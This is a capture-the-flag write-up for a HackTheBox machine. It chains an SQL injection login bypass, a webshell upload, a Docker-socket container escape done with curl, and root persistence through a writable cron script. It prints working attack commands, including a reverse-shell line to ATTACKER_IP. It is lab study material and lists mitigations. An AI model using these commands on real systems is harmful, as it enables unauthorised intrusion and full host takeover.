# 🏁 CTF Writeup: CyBox

**Platform:** HackTheBox  
**Difficulty:** 🔴 Hard  
**Category:** Web (SQLi) → Container Escape → Host Cron → Root  
**Status:** ✅ Solved (Root)

---

## 📝 Summary

A layered attack chain: SQL injection for initial access, insecure file upload for RCE, Docker container escape via mounted socket, and finally abusing a root cron job to own the host.

**Attack Chain:**
```
SQLi Login Bypass → File Upload RCE → Container Shell → Docker Socket Escape → Host Root via Cron
```

---

## 🔍 Phase 1: SQL Injection — Login Bypass

### Target

A login form with what appeared to be a basic auth check.

### Payload Used

```sql
' OR '1'='1' -- -
```

Logged in as `admin` ✅

### Database Dumping

Used `sqlmap` (educational reference):

```bash
sqlmap -u "http://TARGET_IP/login" --data="username=admin&password=test" \
  --dbs --batch --level=3

# Found: cybox_db
# Tables: users, uploads, sessions
```

---

## 💥 Phase 2: File Upload → RCE

Post-login panel had an unrestricted file upload. Uploaded a PHP webshell and accessed via:

```
http://TARGET_IP/uploads/[filename].php?cmd=id
# uid=33(www-data) inside container ✅
```

---

## 🔼 Phase 3: Container Escape via Docker Socket

### Identifying Container

```bash
cat /proc/1/cgroup | grep docker
# Confirmed: inside Docker container

ls -la /var/run/docker.sock
# srw-rw---- 1 root docker  ← SOCKET MOUNTED! Privilege escalation vector
```

### Escape Exploit

```bash
# Using curl to communicate with Docker daemon
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json

# Create privileged container mounting host filesystem
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'

# Start container, execute reverse shell
# → Root shell on HOST filesystem ✅
```

---

## 🔑 Phase 4: Persistence via Cron

```bash
# On host as root (via container escape)
cat /etc/cron.d/backup
# */5 * * * * root /opt/backup.sh

ls -la /opt/backup.sh
# -rwxrwxrwx root root ← world-writable!

# Append reverse shell to cron script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# Wait 5 minutes → Root reverse shell ✅
```

---

## 🚩 Flags

- **User Flag:** `HTB{[REDACTED]}`
- **Root Flag:** `HTB{[REDACTED]}`

---

## 🧠 Key Takeaways

| Lesson | Details |
|--------|---------|
| **SQLi Login Bypass** | Simple OR conditions bypass naive auth queries |
| **Docker Socket** | Mounting `/var/run/docker.sock` = container escape |
| **World-Writable Cron** | Writable scripts run by root = instant root |
| **Defense in Depth** | Each layer needs independent security controls |

---

## 🛡️ Mitigations

1. Use parameterized queries to prevent SQLi
2. Never mount `/var/run/docker.sock` into containers
3. Ensure cron scripts are not world-writable (`chmod 700 /opt/backup.sh`)
4. Run containers with least privilege (no `--privileged`)

---

*This writeup is sanitized. No credentials, live IPs, or flags from active systems are published.*
